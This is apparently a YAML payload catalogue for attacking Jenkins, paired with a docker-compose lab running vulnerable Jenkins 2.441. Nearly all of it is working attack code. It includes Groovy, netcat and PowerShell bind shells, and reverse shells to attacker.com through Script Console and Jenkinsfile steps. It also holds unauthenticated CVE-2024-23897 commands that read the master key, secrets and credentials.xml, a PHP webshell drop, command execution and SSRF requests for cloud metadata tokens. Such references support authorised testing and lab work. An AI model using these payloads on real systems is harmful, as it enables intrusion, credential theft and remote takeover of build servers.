---
comment: "Jenkins exposes a Groovy Script Console at `/script` that executes arbitrary\
  \ code inside the JVM\nrunning the Jenkins process. Access requires the `Overall/Administer`\
  \ permission. The Groovy\nruntime directly invokes Java's `Runtime.getRuntime().exec()`,\
  \ resulting in OS command execution\nas the user running Jenkins (commonly `jenkins`,\
  \ `root`, or a service account).\n\nPipelines (Jenkinsfile) execute shell steps\
  \ in a workspace on an agent node \u2014 useful when direct\nconsole access is unavailable\
  \ but job creation or SCM push rights exist.\n\nCVE-2024-23897 (CVSS 9.8, CISA KEV\
  \ \u2014 Jan 2024): Jenkins CLI uses the args4j library to parse\ncommand arguments.\
  \ The `@` file-reference feature reads the contents of a file from the Jenkins\n\
  controller filesystem and includes it as a CLI argument \u2014 exploitable without\
  \ authentication\nwhen the CLI is enabled (default). Allows reading arbitrary files\
  \ as the Jenkins process user,\nincluding secrets, credentials, and SSH keys.\n"
docker:
  compose: "services:\n  jenkins:\n    image: jenkins/jenkins:2.441\n    ports:\n\
    \      - \"8080:8080\"\n      - \"50000:50000\"\n    volumes:\n      - jenkins_home:/var/jenkins_home\n\
    volumes:\n  jenkins_home:\n"
  note: "Starts Jenkins 2.441 (vulnerable to CVE-2024-23897 unauthenticated file-read\
    \ via CLI).\nAccess at `http://localhost:8080`. On first run, retrieve the unlock\
    \ password with:\n`docker compose exec jenkins cat /var/jenkins_home/secrets/initialAdminPassword`\n\
    The CLI is enabled by default \u2014 download the CLI jar from `http://localhost:8080/jnlpJars/jenkins-cli.jar`.\n\
    Skip plugin installation in the setup wizard to keep the environment minimal.\n"
functions:
  bind-shell:
  - code: |
      ServerSocket server = new ServerSocket(12345)
      Socket client = server.accept()
      Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start()
      InputStream ci = client.getInputStream()
      OutputStream co = client.getOutputStream()
      InputStream pi = p.getInputStream()
      OutputStream po = p.getOutputStream()
      while (!client.isClosed()) {
          while (pi.available() > 0) co.write(pi.read())
          while (ci.available() > 0) po.write(ci.read())
          co.flush()
          po.flush()
          Thread.sleep(50)
      }
      p.destroy()
      server.close()
    comment: |
      Opens a TCP server socket on port 12345 within the JVM and bridges it to `/bin/sh`.
      The Script Console HTTP request hangs until the client disconnects. The Groovy loop
      bridges stdin/stdout between the TCP client and the shell process.
      Connect from the attacker with: nc victim.com 12345
    connector: tcp-client
    contexts:
      authenticated:
      console:
    platform: linux
    tty: false
  - code: |
      ServerSocket server = new ServerSocket(12345)
      Socket client = server.accept()
      Process p = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start()
      InputStream ci = client.getInputStream()
      OutputStream co = client.getOutputStream()
      InputStream pi = p.getInputStream()
      OutputStream po = p.getOutputStream()
      while (!client.isClosed()) {
          while (pi.available() > 0) co.write(pi.read())
          while (ci.available() > 0) po.write(ci.read())
          co.flush()
          po.flush()
          Thread.sleep(50)
      }
      p.destroy()
      server.close()
    comment: "Windows variant \u2014 identical bridge logic but spawns `cmd.exe` instead\
      \ of `/bin/sh`.\nThe Script Console HTTP request hangs until the client disconnects.\n\
      Connect from the attacker with: nc victim.com 12345\n"
    connector: tcp-client
    contexts:
      authenticated:
      console:
    platform: windows
    tty: false
  - code: |
      pipeline {
          agent any
          stages {
              stage('x') {
                  steps {
                      sh 'nc -lvp 12345 -e /bin/sh'
                  }
              }
          }
      }
    comment: |
      Opens a bind shell via a Jenkinsfile pipeline step on the agent node. Requires `nc`
      with `-e` support (standard on most Linux agents). The job hangs while the shell is active.
      Connect from the attacker with: nc victim.com 12345
    connector: tcp-client
    contexts:
      ci_cd:
    platform: linux
    tty: false
  - code: |
      pipeline {
          agent any
          stages {
              stage('x') {
                  steps {
                      bat 'powershell -NoP -Exec Bypass -Command "$l=New-Object Net.Sockets.TcpListener 12345;$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$r=[Text.Encoding]::ASCII.GetBytes((iex ([Text.Encoding]::ASCII.GetString($b,0,$i)) |Out-String));$s.Write($r,0,$r.Length);$s.Flush()}"'
                  }
              }
          }
      }
    comment: "Windows variant \u2014 opens a PowerShell TcpListener bind shell on\
      \ the agent node via a\nJenkinsfile `bat` step. The job hangs while the shell\
      \ is active.\nConnect from the attacker with: nc victim.com 12345\n"
    connector: tcp-client
    contexts:
      ci_cd:
    platform: windows
    tty: false
  file-read:
  - code: |
      # Download the Jenkins CLI jar (no auth required)
      curl -s http://victim.com:8080/jnlpJars/jenkins-cli.jar -o jenkins-cli.jar

      # Read arbitrary files via the @ file-reference feature (unauthenticated)
      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/etc/passwd"

      # Read Jenkins master key (used to decrypt stored credentials)
      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/var/lib/jenkins/secrets/master.key"

      # Read hudson.util.Secret (AES key wrapping the credentials encryption)
      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/var/lib/jenkins/secrets/hudson.util.Secret"

      # Read stored credentials XML
      java -jar jenkins-cli.jar -s http://victim.com:8080 help "@/var/lib/jenkins/credentials.xml"
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2024-23897:\
      \ The Jenkins CLI arg parser passes `@<path>` arguments to FileInputStream,\n\
      reading the referenced file from the controller's filesystem into the CLI response.\n\
      The first line is reflected in error output; binary files read partially.\n\n\
      For more complete multi-line reads use the `reload-configuration` command:\n\
      \  java -jar jenkins-cli.jar -s http://victim.com:8080 reload-configuration\
      \ \"@/etc/passwd\"\n\nDecrypt credentials after extracting master.key + hudson.util.Secret\
      \ + credentials.xml:\n  python3 jenkins-credentials-decryptor  (github.com/hoto/jenkins-credentials-decryptor)\n\
      \nRef: https://www.jenkins.io/security/advisory/2024-01-24/\nnuclei: CVE-2024-23897\n"
    contexts:
      unauthenticated:
    version: |-
      <= 2.441 / LTS <= 2.426.2
  - code: |
      println new File("/etc/passwd").text
    comment: |
      Reads an arbitrary file from the Jenkins controller's filesystem via the Script Console.
      Useful for extracting credentials, SSH keys, or the Jenkins secrets directory
      at /var/lib/jenkins/secrets/.
    contexts:
      authenticated:
      console:
  file-write:
  - code: |
      new File("/var/lib/jenkins/userContent/shell.php").text = '<?php system($_GET["c"]); ?>'
    comment: |
      Writes arbitrary content to a file on the Jenkins controller's filesystem via the Script
      Console. The `userContent/` directory is served by Jenkins at /userContent/<file>, making
      it a reliable webshell drop location without needing to know the webroot.
      Access the shell at: http://victim.com:8080/userContent/shell.php?c=id
    contexts:
      authenticated:
      console:
  rce:
  - code: |
      def cmd = ["id"].execute()
      cmd.waitFor()
      println cmd.text
    comment: |
      Executes a command via Groovy's `.execute()` method and returns stdout. Works in the Script
      Console under any credential with `Overall/Administer`. Use a List form for commands with
      arguments to avoid shell-splitting issues:
        ["ls", "-la", "/var/lib/jenkins/secrets"].execute()
    contexts:
      authenticated:
      console:
    platform: linux
  - code: |
      def cmd = ["cmd.exe", "/c", "whoami"].execute()
      cmd.waitFor()
      println cmd.text
    comment: "Windows variant \u2014 uses `cmd.exe /c` instead of the Linux exec shorthand.\
      \ Works in the\nScript Console under any credential with `Overall/Administer`.\
      \ Use a List form for\ncommands with arguments: [\"cmd.exe\", \"/c\", \"dir\
      \ C:\\\\Users\"].execute()\n"
    contexts:
      authenticated:
      console:
    platform: windows
  - code: |
      pipeline {
          agent any
          stages {
              stage('x') {
                  steps {
                      sh 'id'
                  }
              }
          }
      }
    comment: |
      Executes a command as a shell build step in a declarative pipeline. Suitable when the
      attacker can create or modify a Jenkins job or push a Jenkinsfile to a watched SCM branch.
    contexts:
      ci_cd:
    platform: linux
  - code: |
      pipeline {
          agent any
          stages {
              stage('x') {
                  steps {
                      bat 'whoami'
                  }
              }
          }
      }
    comment: "Windows variant \u2014 uses `bat` instead of `sh` for Windows agent\
      \ nodes. Suitable when the\nattacker can create or modify a Jenkins job or push\
      \ a Jenkinsfile to a watched SCM branch.\n"
    contexts:
      ci_cd:
    platform: windows
  reverse-shell:
  - blind: true
    code: |
      String host = "attacker.com"
      int port = 12345
      String cmd = "/bin/bash"
      Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
      Socket s = new Socket(host, port)
      InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
      OutputStream po = p.getOutputStream(), so = s.getOutputStream()
      while (!s.isClosed()) {
          while (pi.available() > 0) so.write(pi.read())
          while (pe.available() > 0) so.write(pe.read())
          while (si.available() > 0) po.write(si.read())
          so.flush()
          po.flush()
          Thread.sleep(50)
      }
      p.destroy()
      s.close()
    comment: "Opens a raw TCP socket from within the JVM and bridges it to a spawned\
      \ `/bin/bash` process.\nThe Script Console HTTP request hangs while the shell\
      \ is active. Interaction happens via\nthe TCP socket to attacker.com:12345 \u2014\
      \ the HTTP response does not reflect shell output.\nThe shell persists until\
      \ the socket is closed or the Jenkins process restarts.\n"
    contexts:
      authenticated:
      console:
    listener: tcp-server
    platform: linux
    tty: false
  - blind: true
    code: |
      String host = "attacker.com"
      int port = 12345
      String ps = '$c=New-Object Net.Sockets.TCPClient("' + host + '",' + port + ');' +
          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){' +
          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
          '$sb=(iex $d 2>&1|Out-String);' +
          '$r=[Text.Encoding]::ASCII.GetBytes($sb+"PS "+(pwd).Path+"> ");' +
          '$s.Write($r,0,$r.Length);$s.Flush()}'
      ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps].execute()
    comment: "Windows variant \u2014 spawns a PowerShell interactive reverse shell\
      \ from the Groovy Script\nConsole. PowerShell connects to attacker.com:12345\
      \ and returns command output prefixed\nwith the current working directory prompt\
      \ (PS C:\\...> ).\nThe Groovy execute() call is fire-and-forget; check the listener\
      \ for the connection.\n"
    contexts:
      authenticated:
      console:
    listener: tcp-server
    platform: windows
    tty: false
  - blind: true
    code: |
      pipeline {
          agent any
          stages {
              stage('x') {
                  steps {
                      sh 'bash -i >& /dev/tcp/attacker.com/12345 0>&1'
                  }
              }
          }
      }
    comment: |
      Reverse shell via a Jenkinsfile pipeline step. Executed on the agent node, not the
      Jenkins controller. Useful when only job creation or SCM write access is available.
      The pipeline job log will show the step as running; the shell output goes to the
      attacker's listener, not the build log.
    contexts:
      ci_cd:
    listener: tcp-server
    platform: linux
    tty: false
  ssrf:
  - code: |
      // Probe any internal endpoint from the Jenkins controller via the Script Console
      println new URL("http://169.254.169.254/latest/meta-data/iam/security-credentials/").text

      // Fetch GCP metadata (requires the Metadata-Flavor header)
      println new URL("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
          .openConnection().with {
              setRequestProperty("Metadata-Flavor", "Google")
              inputStream.text
          }

      // Probe an internal service (e.g., unauthenticated Kubernetes API)
      println new URL("http://10.0.0.1:8080/api/v1/namespaces").text
    comment: "The Groovy Script Console executes arbitrary Java/Groovy code in the\
      \ JVM, including\noutbound HTTP requests. `new URL(...).text` performs a synchronous\
      \ GET and returns the\nfull response body \u2014 ideal for probing internal\
      \ services or cloud metadata endpoints.\n\nThe request originates from the Jenkins\
      \ controller host, which typically has access to:\n  - AWS IMDSv1: http://169.254.169.254/latest/meta-data/\n\
      \  - GCP metadata: http://metadata.google.internal/computeMetadata/v1/\n  -\
      \ Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\
      \  - Internal Kubernetes API, databases, and microservices unreachable from\
      \ the internet\n"
    contexts:
      authenticated:
      console:
